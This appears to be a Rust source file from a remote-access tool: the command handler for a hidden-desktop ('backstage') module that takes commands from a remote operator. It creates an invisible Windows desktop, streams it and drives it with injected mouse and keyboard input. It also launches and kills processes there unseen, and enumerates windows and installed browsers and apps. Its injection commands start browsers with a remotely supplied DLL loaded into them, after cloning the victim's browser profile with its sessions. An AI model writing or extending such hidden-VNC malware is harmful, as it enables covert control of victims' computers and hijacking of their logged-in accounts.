use std::{
    path::PathBuf,
    sync::atomic::Ordering,
    time::Duration,
};

use tokio_util::sync::CancellationToken;

use crate::{
    commands::{Ctx, desktop, input},
    protocol::{self, Obj, Value},
};

pub async fn handle(ctx: Ctx) {
    match ctx.command.name.as_str() {
        "backstage_start" => backstage_start(ctx).await,
        "backstage_stop" => {
            crate::state::cancel_stream(&ctx.state.backstage);
            crate::state::cancel_stream(&ctx.state.virtual_stream);
            #[cfg(windows)]
            {
                let _ = tokio::task::spawn_blocking(|| {
                    crate::win::hidden::kill_all();
                    crate::win::hidden::stop();
                })
                .await;
            }
            ctx.out.result(&ctx.command, true, None).await;
        }
        "backstage_select_display" => {
            let display = ctx.integer("display").unwrap_or(0).max(0) as usize;
            ctx.state
                .backstage_settings
                .display
                .store(display, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "backstage_set_resolution" => {
            let max_height = ctx.integer("maxHeight").unwrap_or(1080).max(1) as u32;
            ctx.state
                .backstage_settings
                .max_height
                .store(max_height, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "backstage_set_fps" => {
            let fps = ctx.integer("fps").unwrap_or(120).clamp(1, 240) as u32;
            ctx.state.backstage_settings.fps.store(fps, Ordering::Relaxed);
            ctx.state.virtual_settings.fps.store(fps, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "backstage_set_quality" => {
            let quality = ctx.integer("quality").unwrap_or(90).clamp(1, 100) as u32;
            ctx.state
                .backstage_settings
                .quality
                .store(quality, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "backstage_request_keyframe" => {
            ctx.out.result(&ctx.command, true, None).await;
        }
        "backstage_enable_dxgi" | "backstage_enable_printwindow_fallback"
        | "backstage_enable_uia" => {
            ctx.out.result(&ctx.command, true, None).await;
        }
        "backstage_enable_mouse" => {
            let enabled = ctx.boolean_or("enabled", true);
            ctx.state
                .backstage_input
                .mouse
                .store(enabled, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "backstage_enable_keyboard" => {
            let enabled = ctx.boolean_or("enabled", true);
            ctx.state
                .backstage_input
                .keyboard
                .store(enabled, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "backstage_enable_cursor" => {
            let enabled = ctx.boolean_or("enabled", false);
            ctx.state
                .backstage_input
                .cursor
                .store(enabled, Ordering::Relaxed);
            ctx.state
                .backstage_settings
                .cursor
                .store(enabled, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "backstage_mouse_move" | "backstage_mouse_down" | "backstage_mouse_up"
        | "backstage_mouse_wheel" => hidden_mouse(&ctx).await,
        "backstage_key_down" | "backstage_key_up" => hidden_key(&ctx).await,
        "backstage_start_process" => backstage_start_process(ctx).await,
        "backstage_kill_all" => {
            ctx.out.result(&ctx.command, true, None).await;
            #[cfg(windows)]
            {
                let _ = tokio::task::spawn_blocking(crate::win::hidden::kill_all).await;
            }
        }
        "backstage_window_list" => {
            ctx.out.result(&ctx.command, true, None).await;
            send_window_list(&ctx).await;
        }
        "backstage_browser_check" => {
            ctx.out.result(&ctx.command, true, None).await;
            send_browser_check(&ctx).await;
        }
        "backstage_installed_apps" => {
            ctx.out.result(&ctx.command, true, None).await;
            send_installed_apps(&ctx).await;
        }
        "backstage_lookup" => backstage_lookup(ctx).await,
        "backstage_start_process_injected" | "backstage_start_chrome_injected"
        | "backstage_start_browser_injected" => injected(ctx).await,
        _ => {
            ctx.out
                .result(&ctx.command, false, Some("unknown backstage command"))
                .await;
        }
    }
}

async fn backstage_start(ctx: Ctx) {
    if ctx.boolean_or("virtual_mode", false) {
        let state = ctx.state.clone();
        let out = ctx.out.clone();
        let settings = state.virtual_settings.clone();
        let cancel = CancellationToken::new();
        crate::state::set_stream(&state.virtual_stream, cancel.clone(), settings.clone());
        tokio::spawn(async move {
            desktop::stream_loop(state, out, settings, cancel, true, false).await;
        });
        ctx.out.result(&ctx.command, true, None).await;
        return;
    }
    #[cfg(windows)]
    if let Err(error) = crate::win::hidden::ensure() {
        ctx.out.result(&ctx.command, false, Some(&error)).await;
        return;
    }
    let auto_explorer = ctx.boolean_or("autoStartExplorer", false);
    if auto_explorer {
        #[cfg(windows)]
        {
            let _ = tokio::task::spawn_blocking(|| {
                let _ = crate::win::hidden::start_process("explorer.exe", "", None);
            })
            .await;
        }
    }
    let state = ctx.state.clone();
    let out = ctx.out.clone();
    let settings = state.backstage_settings.clone();
    let cancel = CancellationToken::new();
    crate::state::set_stream(&state.backstage, cancel.clone(), settings.clone());
    tokio::spawn(async move {
        run_backstage_stream(state, out, settings, cancel).await;
    });
    ctx.out.result(&ctx.command, true, None).await;
}

async fn run_backstage_stream(
    state: std::sync::Arc<crate::state::State>,
    out: crate::state::Outbound,
    settings: std::sync::Arc<crate::state::StreamSettings>,
    cancel: CancellationToken,
) {
    #[cfg(windows)]
    {
        desktop::stream_loop(state, out, settings, cancel, true, true).await;
    }
    #[cfg(not(windows))]
    {
        let _ = (state, out, settings, cancel);
    }
}

async fn hidden_mouse(ctx: &Ctx) {
    if !ctx.state.backstage_input.mouse.load(Ordering::Relaxed) {
        ctx.out.result(&ctx.command, true, None).await;
        return;
    }
    #[cfg(windows)]
    {
        let display = ctx.state.backstage_settings.display.load(Ordering::Relaxed);
        let max_height = ctx
            .state
            .backstage_settings
            .max_height
            .load(Ordering::Relaxed);
        let x = ctx.integer("x").unwrap_or(0);
        let y = ctx.integer("y").unwrap_or(0);
        let (absolute_x, absolute_y) = input::resolve_point(display, max_height, x, y);
        match ctx.command.name.as_str() {
            "backstage_mouse_move" => crate::win::hidden::mouse_move(absolute_x, absolute_y),
            "backstage_mouse_down" => {
                crate::win::hidden::mouse_move(absolute_x, absolute_y);
                crate::win::hidden::mouse_button(ctx.integer("button").unwrap_or(0), true);
            }
            "backstage_mouse_up" => {
                crate::win::hidden::mouse_move(absolute_x, absolute_y);
                crate::win::hidden::mouse_button(ctx.integer("button").unwrap_or(0), false);
            }
            _ => {
                crate::win::hidden::mouse_move(absolute_x, absolute_y);
                crate::win::hidden::mouse_wheel(ctx.integer("delta").unwrap_or(0) as i32);
            }
        }
    }
}

async fn hidden_key(ctx: &Ctx) {
    if !ctx.state.backstage_input.keyboard.load(Ordering::Relaxed) {
        ctx.out.result(&ctx.command, true, None).await;
        return;
    }
    #[cfg(windows)]
    {
        let code = ctx.string("code").unwrap_or("");
        let vk = crate::win::input::dom_code_to_vk(code);
        if vk != 0 {
            let text = if ctx.command.name == "backstage_key_down" {
                ctx.string("text").map(str::to_owned)
            } else {
                None
            };
            crate::win::hidden::key(vk, text, ctx.command.name == "backstage_key_down");
        }
    }
}

async fn backstage_start_process(ctx: Ctx) {
    let path = ctx.string("path").unwrap_or("").to_owned();
    let kill_exe = ctx.string("kill_exe").unwrap_or("").to_owned();
    let out = ctx.out.clone();
    if path.is_empty() {
        ctx.out
            .result(&ctx.command, false, Some("missing path"))
            .await;
        return;
    }
    #[cfg(windows)]
    if let Err(error) = crate::win::hidden::ensure() {
        ctx.out.result(&ctx.command, false, Some(&error)).await;
        return;
    }
    ctx.out.result(&ctx.command, true, None).await;
    let _ = tokio::task::spawn_blocking(move || {
        if !kill_exe.is_empty() {
            for process in crate::win::process::list() {
                if process.name.eq_ignore_ascii_case(&kill_exe) {
                    let _ = crate::win::process::kill(process.pid);
                }
            }
            let _ = out.blocking_send(launch_status("", "kill", true, ""));
        }
        match crate::win::hidden::start_process(&path, "", None) {
            Ok(pid) => {
                let _ = out.blocking_send(launch_status(
                    "",
                    "launch",
                    true,
                    &format!("pid {pid}"),
                ));
            }
            Err(error) => {
                let _ = out.blocking_send(launch_status("", "launch", false, &error));
            }
        }
    })
    .await;
}

async fn injected(ctx: Ctx) {
    let browser = ctx.string_or("browser", "");
    if ctx.command.name == "backstage_start_browser_injected" && browser.is_empty() {
        ctx.out
            .result(&ctx.command, false, Some("no browser specified"))
            .await;
        return;
    }
    let Some(dll) = ctx.bytes("dll").map(|value| value.to_vec()) else {
        ctx.out
            .result(&ctx.command, false, Some("no DLL provided"))
            .await;
        return;
    };
    #[cfg(windows)]
    if let Err(error) = crate::win::hidden::ensure() {
        ctx.out.result(&ctx.command, false, Some(&error)).await;
        return;
    }
    let mut application = ctx.string("path").unwrap_or("").to_owned();
    if application.is_empty() && ctx.command.name == "backstage_start_browser_injected" {
        application = crate::win::inject::browser_path(&browser)
            .map(|path| path.to_string_lossy().into_owned())
            .unwrap_or_default();
    }
    if application.is_empty() {
        ctx.out
            .result(&ctx.command, false, Some("no process path specified"))
            .await;
        return;
    }
    let clone = ctx.boolean_or("clone", true);
    let clone_lite = ctx.boolean_or("cloneLite", false);
    let out = ctx.out.clone();
    ctx.out.result(&ctx.command, true, None).await;

    let _ = tokio::task::spawn_blocking(move || {
        let mut args = String::new();
        if ctx.command.name == "backstage_start_browser_injected" {
            let profile = if clone {
                let source = crate::win::hidden::browser_data_dir(&browser);
                match source {
                    Some(source) => {
                        let _ = out.blocking_send(clone_progress(&browser, 0, 0, 0, "scanning"));
                        match crate::win::hidden::clone_profile(&browser, &source, clone_lite) {
                            Ok(profile) => {
                                let _ = out.blocking_send(clone_progress(&browser, 50, 0, 0, "cloning"));
                                let _ = out.blocking_send(clone_progress(&browser, 100, 0, 0, "done"));
                                Some(profile)
                            }
                            Err(error) => {
                                let _ = out.blocking_send(clone_progress(
                                    &browser,
                                    100,
                                    0,
                                    0,
                                    &format!("done_with_errors|{error}"),
                                ));
                                None
                            }
                        }
                    }
                    None => None,
                }
            } else {
                None
            };
            let profile = profile.unwrap_or_else(|| {
                let path = std::env::temp_dir()
                    .join("Microsoft")
                    .join(format!("{browser}-{}", uuid::Uuid::new_v4().simple()));
                let _ = std::fs::create_dir_all(&path);
                path
            });
            args = crate::win::hidden::browser_arguments(&browser, &profile);
        }
        let _ = out.blocking_send(launch_status(&browser, "launch", true, "starting"));
        match crate::win::hidden::start_process(&application, &args, Some(dll)) {
            Ok(pid) => {
                let _ = out.blocking_send(launch_status(
                    &browser,
                    "launch",
                    true,
                    &format!("pid {pid}"),
                ));
            }
            Err(error) => {
                let _ = out.blocking_send(launch_status(&browser, "launch", false, &error));
            }
        }
    })
    .await;
}

fn clone_progress(
    browser: &str,
    percent: i64,
    copied: i64,
    total: i64,
    status: &str,
) -> Value {
    Obj::new()
        .put(protocol::key_type(), protocol::s("backstage_clone_progress"))
        .put(protocol::key_browser(), protocol::s(browser))
        .put(protocol::key_percent(), protocol::n(percent))
        .put(protocol::key_copied_bytes(), protocol::n(copied))
        .put(protocol::key_total_bytes(), protocol::n(total))
        .put(protocol::key_status(), protocol::s(status))
        .value()
}

async fn backstage_lookup(ctx: Ctx) {
    let exe = ctx.string("exe").unwrap_or("").to_owned();
    if exe.is_empty() {
        ctx.out
            .result(&ctx.command, false, Some("no exe name provided"))
            .await;
        return;
    }
    ctx.out.result(&ctx.command, true, None).await;
    let out = ctx.out.clone();
    let exe_lower = exe.to_lowercase();
    let _ = tokio::task::spawn_blocking(move || {
        #[cfg(windows)]
        {
            for process in crate::win::process::list() {
                if process.name.to_lowercase() == exe_lower && !process.exe_path.is_empty() {
                    out.blocking_send(
                        Obj::new()
                            .put(protocol::key_type(), protocol::s("backstage_lookup_result"))
                            .put(protocol::key_exe(), protocol::s(&process.name))
                            .put(protocol::key_path(), protocol::s(&process.exe_path))
                            .put(protocol::key_done(), protocol::b(false))
                            .value(),
                    );
                }
            }
        }
        out.blocking_send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("backstage_lookup_result"))
                .put(protocol::key_exe(), protocol::s(&exe_lower))
                .put(protocol::key_path(), protocol::s(""))
                .put(protocol::key_done(), protocol::b(true))
                .value(),
        );
    })
    .await;
}

fn launch_status(browser: &str, step: &str, success: bool, detail: &str) -> Value {
    Obj::new()
        .put(protocol::key_type(), protocol::s("backstage_browser_launch_status"))
        .put(protocol::key_browser(), protocol::s(browser))
        .put(protocol::key_step(), protocol::s(step))
        .put(protocol::key_success(), protocol::b(success))
        .put(protocol::key_detail(), protocol::s(detail))
        .value()
}

pub async fn send_window_list(ctx: &Ctx) {
    #[cfg(windows)]
    let (windows, monitors) = tokio::task::spawn_blocking(crate::win::hidden::window_list_sync)
        .await
        .unwrap_or_default();
    #[cfg(not(windows))]
    let (windows, monitors): (Vec<crate::win::hidden::WindowEntry>, Vec<crate::win::hidden::MonitorEntry>) =
        (Vec::new(), Vec::new());

    let window_values = windows
        .into_iter()
        .map(|window| {
            Obj::new()
                .put(protocol::key_title(), protocol::s(&window.title))
                .put(protocol::key_x(), protocol::n(window.x as i64))
                .put(protocol::key_y(), protocol::n(window.y as i64))
                .put(protocol::key_width(), protocol::n(window.width as i64))
                .put(protocol::key_height(), protocol::n(window.height as i64))
                .put(protocol::key_pid(), protocol::n(window.pid as i64))
                .put(protocol::key_process_name(), protocol::s(&window.process_name))
                .put(protocol::key_monitor(), protocol::n(0))
                .value()
        })
        .collect::<Vec<_>>();
    let monitor_values = monitors
        .into_iter()
        .map(|monitor| {
            Obj::new()
                .put(protocol::key_index(), protocol::n(monitor.index as i64))
                .put(protocol::key_name(), protocol::s(&monitor.name))
                .put(protocol::key_x(), protocol::n(monitor.x as i64))
                .put(protocol::key_y(), protocol::n(monitor.y as i64))
                .put(protocol::key_width(), protocol::n(monitor.width as i64))
                .put(protocol::key_height(), protocol::n(monitor.height as i64))
                .put(protocol::key_primary(), protocol::b(monitor.primary))
                .value()
        })
        .collect::<Vec<_>>();
    ctx.out
        .send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("backstage_window_list_result"))
                .put(protocol::key_windows(), protocol::arr(window_values))
                .put(protocol::key_monitors(), protocol::arr(monitor_values))
                .value(),
        )
        .await;
}

async fn send_browser_check(ctx: &Ctx) {
    #[cfg(windows)]
    let browsers = {
        let mut map = Vec::new();
        for (name, path) in [
            ("chrome", r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
            ("msedge", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
            ("firefox", r"C:\Program Files\Mozilla Firefox\firefox.exe"),
            ("brave", r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"),
            ("opera", r"C:\Program Files\Opera\opera.exe"),
        ] {
            map.push((protocol::s(name), protocol::b(PathBuf::from(path).exists())));
        }
        Value::Map(map)
    };
    #[cfg(not(windows))]
    let browsers = Value::Map(Vec::new());
    ctx.out
        .send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("backstage_browser_check_result"))
                .put(protocol::key_browsers(), browsers)
                .value(),
        )
        .await;
}

async fn send_installed_apps(ctx: &Ctx) {
    let mut apps = Vec::new();
    #[cfg(windows)]
    {
        let roots = [
            std::env::var_os("ProgramData").map(PathBuf::from),
            std::env::var_os("APPDATA").map(PathBuf::from),
        ];
        for root in roots.into_iter().flatten() {
            let menu = root.join("Microsoft").join("Windows").join("Start Menu").join("Programs");
            collect_shortcuts(&menu, &mut apps, 0);
        }
    }
    ctx.out
        .send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("backstage_installed_apps_result"))
                .put(protocol::key_apps(), protocol::arr(apps))
                .put(protocol::key_done(), protocol::b(true))
                .value(),
        )
        .await;
}

#[cfg(windows)]
fn collect_shortcuts(directory: &std::path::Path, apps: &mut Vec<Value>, depth: usize) {
    if depth > 4 {
        return;
    }
    let Ok(entries) = std::fs::read_dir(directory) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            collect_shortcuts(&path, apps, depth + 1);
        } else if path
            .extension()
            .map(|value| value.to_string_lossy().eq_ignore_ascii_case("lnk"))
            .unwrap_or(false)
        {
            let name = path
                .file_stem()
                .map(|value| value.to_string_lossy().into_owned())
                .unwrap_or_default();
            apps.push(
                Obj::new()
                    .put(protocol::key_name(), protocol::s(&name))
                    .put(protocol::key_exe_path(), protocol::s(&path.to_string_lossy()))
                    .put(protocol::key_icon(), protocol::s(""))
                    .value(),
            );
            if apps.len() >= 200 {
                return;
            }
        }
    }
}

#[allow(dead_code)]
async fn _sleep() {
    tokio::time::sleep(Duration::from_millis(1)).await;
}
